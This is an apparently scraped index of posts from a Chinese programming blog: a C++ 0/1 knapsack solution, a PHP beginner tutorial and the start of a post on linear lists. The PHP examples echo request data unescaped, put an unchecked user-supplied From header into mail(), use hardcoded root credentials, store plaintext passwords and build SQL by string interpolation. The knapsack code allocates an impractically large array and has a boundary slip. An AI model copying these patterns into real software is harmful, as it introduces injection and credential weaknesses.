main()&#123; cin &gt;&gt; t; while (t--) &#123; cin &gt;&gt; m &gt;&gt; n; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; w[i]; &#125; sort(w, w + n); int ans = 0, c = m; for (int i = 0; i &lt; n; i++) &#123; if (w[i] &lt;= c) &#123; ans++; c -= w[i]; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; &#125; return 0;&#125; 问题 E: 极冰防御——盾山题目描述盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。 盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。 假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？ 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。 接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。 样例输入1234567110 52 62 36 55 44 6 样例输出115 提示结果可能超过int范围，请使用long long类型变量 思路说了这么多，其实就是经典的01背包问题。 之前有一道01背包用cin/cout过不了，只能用scanf/printf，所以到时候看情况吧.. 代码123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int maxn = 10005;ll dp[maxn][maxn];ll w[maxn], p[maxn];ll c, n;int main()&#123; int t; cin &gt;&gt; t; //scanf(\"%d\", &amp;t); while (t--) &#123; cin &gt;&gt; c &gt;&gt; n; //scanf(\"%lld %lld\", &amp;c, &amp;n); for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; w[i] &gt;&gt; p[i]; //scanf(\"%lld %lld\", &amp;w[i], &amp;p[i]); &#125; ll jMax = min(w[n] - 1, c); for (int j = 0; j &lt;= jMax; j++) dp[n][j] = 0; for (int j = w[n]; j &lt;= c; j++) dp[n][j] = p[n]; for (int i = n - 1; i &gt; 0; i--) &#123; jMax = min(w[i] - 1, c); for (int j = 0; j &lt;= jMax; j++) dp[i][j] = dp[i + 1][j]; for (int j = w[i]; j &lt;= c; j++) dp[i][j] = max(dp[i + 1][j], dp[i + 1][j - w[i]] + p[i]); &#125; dp[1][c] = dp[2][c]; if (c &gt; w[1]) dp[1][c] = max(dp[2][c], dp[2][c - w[1]] + p[1]); cout &lt;&lt; dp[1][c] &lt;&lt; endl; //printf(\"%lld\\n\", dp[1][c]); &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"PHP快速入门","slug":"PHP快速入门","date":"2020-09-07T09:33:31.000Z","updated":"2020-11-15T13:29:20.253Z","comments":true,"path":"2020/09/07/phprumen/","link":"","permalink":"http://aotle.top/2020/09/07/phprumen/","excerpt":"这是一篇PHP快速入门的总结","text":"这是一篇PHP快速入门的总结 hello，world1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;?phpecho &quot;Hello World!&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; PHP 脚本可放置于文档中的任何位置 PHP 脚本以 &lt;?php 开头，以 ?&gt; 结尾，文件后缀名.php 语句以分号结尾 ; 注释：# 单行注释，// 单行注释，/* 多行注释 */ 变量名对大小写敏感：$color 和 $Color 是不同的变量 用户定义的函数、类和关键字（例如 if、else、echo 等等）都对大小写不敏感：Echo &quot;Ok&quot; 和 echo &quot;Ok&quot; 是一样的效果 输出内容到网页上用 echo var_dump()：会返回变量的数据类型和值，调试的时候很有用: var_dump(“text”): string(4) &quot;text&quot;; print_r：Prints human-readable information about a variable PHP变量规则： 变量以 $ 符号开头，其后是变量的名称 变量名称必须以字母或下划线开头 变量名称不能以数字开头 变量名称只能包含字母数字字符和下划线（A-z、0-9 以及 _） 变量名称对大小写敏感（$y 与 $Y 是两个不同的变量） 创建变量 创建变量的时候不指定变量的类型 变量没有类型 PHP 自动的根据变量的值转换为正确的数据类型 变量会在首次赋值时被创建 123&lt;?php$x &#x3D; 10; &#x2F;&#x2F; 这样就创建好了一个变量?&gt; 创建常量 使用define()函数创建常量 它使用三个参数 首个参数定义常量的名称 第二个参数定义常量的值 可选的第三个参数规定常量是否对大小写敏感，默认是false（大小写敏感） 1234&lt;?phpdefine(\"TIME_ZONE\", \"Beijin\");echo TIME_ZONE; // Beijin?&gt; 变量的作用域 global：函数之外声明的变量拥有 global 作用域，只能在函数以外进行访问 local ：函数内部声明的变量拥有 local 作用域，只能在函数内部进行访问 static：变量在函数执行完后不会被删除，就像 C 语言中用 static $GLOBALS[index] 的数组中存储了所有的全局变量，下标为变量名 1234567891011121314151617181920212223242526272829303132&lt;?php$x = 10; // 全局变量$y = 20; // 全局变量function foo() &#123; // 函数定义 global $x; // 函数内访问全局变量需要在全局变量前加 global 关键字 $z = 30; // 局部变量 // 输出：[x: 10, y: , z: 30]，函数内不能访问全局变量 echo \"[x: $x, y: $y, z: $z]&lt;br&gt;\"; // 用 GLOBAL 数组访问全局变量 echo \"x: &#123;$GLOBALS['x']&#125; &lt;br&gt;\";&#125;foo(); // 执行函数// 输出：[x: 10, y: 20, z: ]，函数外不能访问局部变量echo \"[x: $x, y: $y, z: $z]&lt;br&gt;\"; /////////////////////////////////////////////////////////////////////////function bar() &#123; static $x = 0; echo \"static: $x &lt;br&gt;\"; $x++;&#125;bar(); // static: 0 bar(); // static: 1bar(); // static: 2?&gt; 运算符+ - * / %&gt; &lt; &gt;= &lt;= != == === || &amp;&amp;前置++ 后置++ 前置-- 后置--. .= 用于字符串连接 比较特别的是 ==(值相同就认为相等) ===(值相同，并且类型也要相同) 12345678910111213141516171819202122&lt;?php$x = 10;$y = \"10\";var_dump($x); // int(10)echo \"&lt;br&gt;\";var_dump($y); // string(2) \"10\"echo \"&lt;br&gt;\";echo $x == $y; // 1echo \"&lt;br&gt;\";echo $x === $y; // false 输出是空字符串echo \"&lt;br&gt;\";echo ($x === $y) == false; // 1echo \"&lt;br&gt;\";echo ($x === $y) === false; // 1echo \"&lt;br&gt;\";echo $x . \" apples\"; // 10 apples?&gt; 数字与字符串比较数字与字符串比较时, 先尝试将字符串转换为数字, 再比较, 一个不能转换为数字的字符串, 转换结果为0, 故, 与 0 比较总返回 true 123456789101112131415&lt;?php// String to integer// 返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。// 如果字符串第一个是‘-'，则从第二个开始算起echo (int)(\"a11\"); // 0echo \"&lt;br&gt;\";echo (int)(\"11a\"); // 11echo \"&lt;br&gt;\";echo intval(\"a11\"); // 0echo \"&lt;br&gt;\";echo intval(\"11a\"); // 0echo \"&lt;br&gt;\";echo intval(\"11\", 2); // 3// 这个函数后面的参数代表需要转化的数是几进制?&gt; 控制语句if else for foreach while do while switch case 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?php///////////////////////////////////////////////////////////////////////////////// if else///////////////////////////////////////////////////////////////////////////////echo \"&lt;br&gt;&lt;br&gt;If else&lt;br&gt;\";$score = 70;if ($score &lt; 60) &#123; echo \"小于 60 &lt;br&gt;\";&#125; else if ($score &lt; 80) &#123; echo \"大于等于 60，小于 80 &lt;br&gt;\";&#125; else &#123; echo \"大于 80 &lt;br&gt;\";&#125;///////////////////////////////////////////////////////////////////////////////// for: 输出 1 到 10///////////////////////////////////////////////////////////////////////////////echo \"&lt;br&gt;&lt;br&gt;For&lt;br&gt;\";for ($i = 1; $i &lt;= 10; $i++) &#123; echo \"$i&lt;br&gt;\";&#125;///////////////////////////////////////////////////////////////////////////////// foreach: 输出数组中的所有元素///////////////////////////////////////////////////////////////////////////////// foreach 循环只适用于数组，并用于遍历数组中的每个键/值对。echo \"&lt;br&gt;&lt;br&gt;Foreach&lt;br&gt;\";$colors = array(\"Red\", \"Green\", \"Blue\", \"White\", \"Black\");foreach ($colors as $color) &#123; echo \"$color &lt;br&gt;\";&#125;///////////////////////////////////////////////////////////////////////////////// while: 输出 1 到 10///////////////////////////////////////////////////////////////////////////////echo \"&lt;br&gt;&lt;br&gt;While&lt;br&gt;\";$i = 0;while ($i++ &lt; 10) &#123; echo \"$i&lt;br&gt;\";&#125;///////////////////////////////////////////////////////////////////////////////// do while: 输出 1 到 10///////////////////////////////////////////////////////////////////////////////echo \"&lt;br&gt;&lt;br&gt;Do while&lt;br&gt;\";$i = 1;do &#123; echo \"$i&lt;br&gt;\";&#125; while (++$i &lt;= 10);///////////////////////////////////////////////////////////////////////////////// switch: 可以使用字符串，数字等///////////////////////////////////////////////////////////////////////////////echo \"&lt;br&gt;&lt;br&gt;Switch&lt;br&gt;\";$condition = \"A\";switch ($condition) &#123;case 1: echo \"Is 1 &lt;br&gt;\"; break;case \"a\":case \"A\": echo \"Is A &lt;br&gt;\"; break;case \"B\": echo \"Is B &lt;br&gt;\"; break;default: echo \"Default &lt;br&gt;\";&#125;?&gt; 函数PHP 内置了 1000 多个函数，功能很强大，例如要计算一个字符串的 MD5 并转换为大写 strtoupper(md5(&quot;Tidy Code&quot;)) 得到 ADCF1E98EBD0FD99E1227346B70BD9E2。 函数创建和 JavaScript 很像，都是以关键字 function 开头，然后是函数名和参数列表，参数支持默认值，函数的定义和调用顺序没有要求，可以递归调用。 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpecho fibonacc(10) . \"&lt;br&gt;\"; // 函数调用，输出：55/** * 函数定义: 递归实现斐波那契数列 */function fibonacc($n) &#123; // 变量 $n 的作用域 是 local. if ($n == 1 || $n == 2) &#123; // 递归结束条件 return 1; &#125; return fibonacc($n - 1) + fibonacc($n - 2); // 递归&#125;// 输出：1, 1, 2, 3, 5, 8, 13, 21, 34, 55,for ($i = 1; $i &lt;= 10; $i++) &#123; echo fibonacc($i) . \", \";&#125;echo \"&lt;br&gt;\";/** * 默认参数只能在参数列表最后面，可以有多个默认参数 */function foo($name, $email = \"xxxx@gmail.com\", $mobile = \"xxxxxxxxxxx\") &#123; echo \"Name is: $name, EMail is: $email, Mobile is: $mobile &lt;br&gt;\";&#125;// 输出：Name is: Alice, EMail is: alice@salmon.com, Mobile is: 12345678901foo(\"Alice\", \"alice@salmon.com\", \"12345678901\");// 输出：Name is: Alice, EMail is: alice@salmon.com, Mobile is: xxxxxxxxxxxfoo(\"Alice\", \"alice@salmon.com\");// 输出：Name is: Alice, EMail is: xxxx@gmail.com, Mobile is: xxxxxxxxxxxfoo(\"Alice\");?&gt; 数组PHP 里的数组实际上是一个字典 Dictionary，也可以叫 Map，就是用 key/value 的形式存储。没有给出 key 的时候 key 默认就是用下标 0，1，2 等。 数组用 array() 来创建，数组的长度用 count() 来计算。 同一个 array 对象推荐单纯的作为数组使用，或者是 Map 使用。不要既有数组的用法，同时也有 Map 的用法。 作为普通数组使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php$colors = array(\"Red\", \"Green\", \"Blue\"); // 定义数组///////////////////////////////////////////////////////////////////////////////// 使用下标直接访问数组元素///////////////////////////////////////////////////////////////////////////////$colors[0] = \"Yellow\"; // 给数组赋元素值echo \"$colors[0], $colors[1], $colors[2] &lt;br&gt;\"; // 用下标访问数组的元素echo \"-------------------------------------------&lt;br&gt;\";///////////////////////////////////////////////////////////////////////////////// 使用 for 循环遍历数组///////////////////////////////////////////////////////////////////////////////$len = count($colors);for ($i = 0; $i &lt; $len; $i++) &#123; echo $colors[$i]; echo \"&lt;br&gt;\";&#125;echo \"-------------------------------------------&lt;br&gt;\";///////////////////////////////////////////////////////////////////////////////// 使用 foreach 循环遍历数组///////////////////////////////////////////////////////////////////////////////foreach ($colors as $color) &#123; echo $color; echo \"&lt;br&gt;\";&#125;?&gt;///////////////////////////////////////////////////////////////////////////////// 使用数组排序sort() // 以升序对数组排序rsort() // 以降序对数组排序asort() // 根据值，以升序对关联数组进行排序ksort() // 根据键，以升序对关联数组进行排序arsort() // 根据值，以降序对关联数组进行排序krsort() // 根据键，以降序对关联数组进行排序//////////////////////////////////////////////////////////////////////////////&lt;?php$numbers = array(1, 3, 5, 9, 5, 8, 4);$len = count($numbers);echo join(\", \", $numbers) . \"&lt;br&gt;\"; // 输出数组元素// 选择排序: 升序for ($i = 0; $i &lt; $len - 1; $i++) &#123; $k = $i; for ($j = $i; $j &lt; $len; $j++) &#123; if ($numbers[$j] &lt; $numbers[$k]) &#123; $k = $j; &#125; &#125; $temp = $numbers[$k]; $numbers[$k] = $numbers[$i]; $numbers[$i] = $temp;&#125;echo join(\", \", $numbers) . \"&lt;br&gt;\";?&gt; 作为 Map 使用123456789101112131415161718192021222324252627282930&lt;?php$ages = array(\"Alice\"=&gt;\"20\", \"Bob\"=&gt;\"25\", \"Josh\"=&gt;\"30\"); // 创建 Map// 另外一种声明方法$age['Peter']=\"35\";$age['Ben']=\"37\";$age['Joe']=\"43\";///////////////////////////////////////////////////////////////////////////////// 使用 key 访问 value，就像 Java 的 Map： map.getValue(key)///////////////////////////////////////////////////////////////////////////////echo $ages[\"Alice\"];echo \"&lt;br&gt;\";echo \"-------------------------------------------&lt;br&gt;\";///////////////////////////////////////////////////////////////////////////////// 输出所有的 key 和 value.///////////////////////////////////////////////////////////////////////////////foreach($ages as $key=&gt;$value) &#123; echo \"Key: $key, Value: $value\"; echo \"&lt;br&gt;\";&#125;echo \"-------------------------------------------&lt;br&gt;\";///////////////////////////////////////////////////////////////////////////////// 输出所有的 value///////////////////////////////////////////////////////////////////////////////foreach($ages as $value) &#123; echo \"Value: $value\"; echo \"&lt;br&gt;\";&#125;?&gt; 作为数组和 Map 混用，下标和 key 理解起来就比较混乱123456789101112131415161718192021222324&lt;?php$colors = array(\"Red\", \"Green\", \"Blue\"); // 下标是 0，1，2，实际应该理解为 key。$colors[5] = \"Yellow\";$colors[6] = \"Purple\";$colors[\"pink\"] = \"Pink\"; // 第 5 个元素，但是不能用 $colors[5] 访问(是 Yellow)$len = count($colors);for ($i = 0; $i &lt; $len; ++$i) &#123; echo $i . \" \" . $colors[$i]; // 下标 3，4 没有元素，所以输出 到 3，4 时会报错 echo \"&lt;br&gt;\";&#125;echo \"-------------------------------------------&lt;br&gt;\";foreach ($colors as $color) &#123; echo $color; echo \"&lt;br&gt;\";&#125;echo \"-------------------------------------------&lt;br&gt;\";echo $colors[5]; // 数字为 key 时可以不用引号echo \"&lt;br&gt;\";echo $colors[\"5\"];?&gt; 处理 GET 和 POST 请求使用 $_GET[&quot;fieldName&quot;] 取得 get 请求的数据使用 $_POST[&quot;fieldName&quot;] 取得 post 请求的数据 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;form action&#x3D;&quot;form.php&quot; method&#x3D;&quot;GET&quot;&gt; &lt;!-- 换成 POST --&gt; Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt; Mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mail&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt; &lt;&#x2F;form&gt; &lt;hr&gt;&lt;?php$name &#x3D; $_GET[&quot;name&quot;]; &#x2F;&#x2F; 换成 $_POST$mail &#x3D; $_GET[&quot;mail&quot;];echo &quot;Name is: $name, Mail is: $mail&quot;;?&gt;&lt;hr&gt;&lt;?php$name &#x3D; &quot;&quot;;$mail &#x3D; &quot;&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;GET&quot;) &#123; &#x2F;&#x2F; GET or POST $name &#x3D; $_GET[&quot;name&quot;]; $mail &#x3D; $_GET[&quot;mail&quot;];&#125; else &#123; $name &#x3D; $_POST[&quot;name&quot;]; $mail &#x3D; $_POST[&quot;mail&quot;];&#125;echo &quot;Request method: &#123;$_SERVER[&quot;REQUEST_METHOD&quot;]&#125;&lt;br&gt;&quot;;echo &quot;Name is: $name, Mail is: $mail&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; Cookie设置 cookie: setcookie(name, value, expire, path, domain)取得 cookie: $_COOKIE[name]删除 cookie: setcookie(name, “”, time()-3600) 设置 cookie 过期就可以了测试 cookie: isset($_COOKIE[name]) 设置 cookie 的页面12345678910111213&lt;?phpsetcookie(&quot;user&quot;, &quot;Bob&quot;, time() + 3600); &#x2F;&#x2F; 必须在 html 的内容前面设置 cookie?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 访问 cookie 的页面123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;?phpecho $_COOKIE[&quot;user&quot;];echo &quot;&lt;br&gt;&quot;;if (isset($_COOKIE[&quot;mail&quot;])) &#123; echo $_COOKIE[&quot;mail&quot;];&#125;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; Session使用 session 前必须启动 session: session_start()设置 session: $_SESSION[name]=value取得 session: $_SESSION[name]删除 session: unset($_SESSION[name])，session_destroy()测试 session: isset($\\ _SESSION[name]) 设置 session 的页面1234567891011121314&lt;?phpsession_start(); &#x2F;&#x2F; 必须在 html 的内容前面设置 cookie$_SESSION[&#39;number&#39;]&#x3D;1;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 访问 session 的页面12345678910111213141516&lt;?phpsession_start(); &#x2F;&#x2F; 必须在 html 的内容前面设置 cookie?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;?phpecho $_SESSION[&quot;number&quot;];?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; Include / Require 文件 通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。include 和 require 语句是相同的，除了错误处理方面： require 会生成致命错误（E_COMPILE_ERROR）并停止脚本 include 只生成警告（E_WARNING），并且脚本会继续 因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。 include &#39;filename&#39;;require &#39;filename&#39;;include_once(&quot;fileName&quot;);require_once(&quot;fileName&quot;); 括号可要可不要 类的定义推荐用 require_once 1234&lt;!-- footer.php --&gt;&lt;?phpecho \"&lt;p&gt;Copyright © 2006-\" . date(\"Y\") . \" W3School.com.cn&lt;/p&gt;\";?&gt; 12345678910&lt;!-- hello.php --&gt;&lt;html&gt;&lt;body&gt; &lt;?php include 'header1.php';?&gt;&lt;/body&gt; &lt;h1&gt;Hello World!&lt;/h1&gt; &lt;p&gt;Section 1&lt;/p&gt; &lt;p&gt;Section 2&lt;/p&gt; &lt;?php require 'footer.php';?&gt;&lt;/body&gt; &lt;p&gt;End&lt;/p&gt;&lt;/html&gt; PHP 的面向对象：类，和 Java 的类很像 类的定义：class className {} 没有访问权限一说 成员变量定义：[qualifier|var] $field; 可以初始化 成员函数定义：[qualifier] function methodName() {}，可带参数 构造函数：__construct() {}，可带参数 创建对象：$obj = new className();，$obj = new className($v1,$v2); 函数调用：$obj-&gt;methodName(); 成员函数内访问成员变量：$this-&gt;fieldName 不是 $this-&gt;$fieldName 成员函数内访问成员函数：$this-&gt;methodName() PHP 不会自动调用父类的构造函数(不支持构造函数重载，可以使用默认参数实现重载)，必须使用 parent 关键字显式地调用 PHP 只支持单继承，使用关键字 extends PHP 也有接口，使用关键字 interface 定义接口，实现接口使用关键字 implements 接口的方法没有实现会报错 访问权限 qualifier：public, protected, private, abstract, final, static。默认是 public 的访问权限 可以把类的定义放在单独的文件里，然后使用 require_once 加载 类定义和继承12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;html&gt;&lt;body&gt;&lt;?phpclass Employee &#123; var $name; var $salary; protected $id; function __construct($name, $salary) &#123; &#x2F;&#x2F; 构造函数 $this-&gt;name &#x3D; $name; $this-&gt;salary &#x3D; $salary; &#125; function getName() &#123; return $this-&gt;name; &#x2F;&#x2F; 不能直接用 return $name; &#125; function setName($name) &#123; $this-&gt;name &#x3D; $name; &#125;&#125;$employee &#x3D; new Employee(&quot;Alice&quot;, 2000);echo $employee-&gt;getName() . &quot;&lt;br&gt;&quot;;$employee-&gt;setName(&quot;Bob&quot;);echo $employee-&gt;getName() . &quot;&lt;br&gt;&quot;;?&gt;&lt;?php&#x2F;&#x2F; 使用继承class Manager extends Employee &#123; var $title; function __construct($name, $salary, $title) &#123; parent::__construct($name, $salary); &#x2F;&#x2F; 调用父类的构造函数 $this-&gt;title &#x3D; $title; &#125; function getTitle() &#123; return $this-&gt;title; &#125;&#125;$manager &#x3D; new Manager(&quot;Alice&quot;, 3000, &quot;Project Manager&quot;);echo $manager-&gt;getName() . &quot;, &quot; . $manager-&gt;getTitle() . &quot;&lt;br&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 实现接口123456789101112131415161718192021222324252627&lt;html&gt;&lt;body&gt;&lt;?phpinterface Flyable &#123; function fly();&#125;interface Runnable &#123; function run();&#125;class Bird implements Flyable, Runnable &#123; function fly() &#123; echo &quot;I can fly.&lt;br&gt;&quot;; &#125; function run() &#123; echo &quot;I can run.&lt;br&gt;&quot;; &#125;&#125;$bird &#x3D; new Bird();$bird-&gt;fly();$bird-&gt;run();?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 静态访问 关键字 self12345678910111213141516171819202122232425&lt;html&gt;&lt;body&gt;&lt;?phpclass Test &#123; public static $count &#x3D; 0; &#x2F;&#x2F; 每创建一个对象 count 就加 1 function __construct() &#123; self::$count++; &#x2F;&#x2F; 函数内部访问静态成员 echo self::$count . &quot; instances are created.&lt;br&gt;&quot;; &#125; static function getCount() &#123; return self::$count; &#125;&#125;echo Test::getCount() . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 类外部访问静态成员函数new Test();new Test();new Test();echo Test::getCount() . &quot;&lt;br&gt;&quot;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 实用代码Array to JSON1234&lt;?php$props = array(\"background\"=&gt;\"black\", \"width\"=&gt;300, \"height\"=&gt;600);echo json_encode($props); // &#123;\"background\":\"black\",\"width\":300,\"height\":600&#125;?&gt; 取得正在访问的网页的网址1234567&lt;?php$url = \"http://\".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];echo $url . \"&lt;br&gt;\"; // http://localhost:8000/hello.php$name = dirname($url);echo $name . \"&lt;br&gt;\"; // http://localhost:8000?&gt; 使用 PHP 发邮件1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;form action&#x3D;&quot;hello.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;Mail to:&lt;&#x2F;td&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mail_to&quot; &#x2F;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;Subject:&lt;&#x2F;td&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;subject&quot; &#x2F;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;Mail From:&lt;&#x2F;td&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mail_from&quot; &#x2F;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td colspan&#x3D;&quot;2&quot;&gt;&lt;textarea name&#x3D;&quot;contents&quot; cols&#x3D;&quot;50&quot; rows&#x3D;&quot;10&quot;&gt;&lt;&#x2F;textarea&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td colspan&#x3D;&quot;2&quot; align&#x3D;&quot;center&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Send Mail&quot;&#x2F;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;&#x2F;form&gt; &lt;?php $mailTo &#x3D; $_POST[&quot;mail_to&quot;]; $mailFrom &#x3D; $_POST[&quot;mail_from&quot;]; $subject &#x3D; $_POST[&quot;subject&quot;]; $contents &#x3D; $_POST[&quot;contents&quot;]; if ($mailTo &amp;&amp; $mailFrom &amp;&amp; $subject &amp;&amp; $contents) &#123; &#x2F;&#x2F; 前面那些HTML代码都是为了填写信息更容易，实际发送邮件代码只是下面一句 &#x2F;&#x2F; 但首先机器上得启动邮件发送程序，Mac下是默认启动的，Linux好像要自己先配置启动 mail($mailTo, $subject, $contents, &quot;From:&quot;.$mailFrom); echo &quot;Mail is successfully sent!&quot;, &quot;&lt;br&gt;&quot;; &#125; ?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; PHP中的非贪婪匹配，默认用的是贪婪匹配12345678910111213141516171819202122232425262728&lt;pre&gt;&lt;?php// 替换图片的目录为统一路径$string = 'a&lt;img src=\"a/b/x.png\"&gt;,Biao,&lt;img src=\"uploads/y.jpg\"&gt;';$string2 = 'a&lt;img src=\"a/b/x.png\"&gt;,Biao,&lt;img src=\"uploads/y.jpg\"&gt;';// /U为非贪婪，这种非贪婪，是从后面向前找，与+?有些区别$pattern ='/&lt;img src=\"(.*)\\/(.+\\\\..+)\"&gt;/U';$replacement = \"&lt;img src=\\\"__IMG_BASE__/$2\\\"&gt;\";echo preg_replace($pattern, $replacement, $string);echo \"-------------\";$pattern ='/&lt;img src=\"(.*)\\/(.+\\\\..+)\"&gt;+?/'; // +?结果与上面的不一样echo preg_replace($pattern, $replacement, $string2);echo \"-------------\";// 找出所有的图片，图片名$pattern =\"/&lt;img src=\\\"(.*)\\/(.+\\\\..+)\\\"&gt;/U\";preg_match_all($pattern, $string, $images);print_r($images);// 输出图片名foreach ($images[2] as $index =&gt; $imageName) &#123; echo \"$imageName&lt;br/&gt;\";&#125;?&gt; 字符串和timestamp的转换 Date Document12345678&lt;?phpecho (strtotime(\"2010-10-28 10:52:21\")); // MySQL格式的字符串转换成秒数echo \"&lt;br/&gt;\";echo (strtotime(\"2010-10-01 00:00:00\"));echo \"&lt;br/&gt;\";$d = date(\"Y-m-d H:i:s\", time()); // 秒数转换成MySQL格式的timestampecho $d;?&gt; 访问 MySQL12345678910111213141516171819202122&lt;?php// 插入数据到数据库中, 数据库操作语句都是使用mysql_querymysql_connect(\"localhost\", \"root\", \"root\"); // 连接到数据库: url, username, passwordmysql_select_db(\"qt\"); // 选择使用数据库中的表$result = mysql_query(\"SELECT username, password FROM user\");while ($row = mysql_fetch_array($result)) &#123; // 每使用一次后，会自动移向下一个游标 // username 和 password 是数据库中列名 echo $row[\"username\"], \", \", $row[\"password\"], \"&lt;br&gt;\";&#125;?&gt;&lt;?php$username = \"Blabla\";$password = date(\"H:i:s\");// 插入数据mysql_query(\"INSERT INTO USER (username, password) VALUES ('$username', '$password')\");// Close MySQL connectionmysql_close();?&gt;","categories":[{"name":"PHP","slug":"PHP","permalink":"http://aotle.top/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://aotle.top/tags/PHP/"}]},{"title":"数据结构--线性表","slug":"数据结构-线性表","date":"2020-06-29T13:13:25.000Z","updated":"2020-12-03T13:54:50.954Z","comments":true,"path":"2020/06/29/xianxingbiao1/","link":"","permalink":"http://aotle.top/2020/06/29/xianxingbiao1/","excerpt":"数据结构之线性表","text":"数据结构之线性表 概念线性表是数据结构中最简单的数据存储结构，可以理解为“线性的表”。 线性，是说数据在逻辑结构上具有线性关系。将具有线性关系的数据存储到计算机中所使用的存储结构称为线性表。 首先是一个序列 其次是有限的 存储的数据本身的类型一定保持相同。 线性表的开始元素没有前驱元素只有后继元素，线性表的结束元素没有后继元素只有前驱元素，除了开头元素和结尾元素以外，每个元素都有且只有一个前驱元素和后继元素。 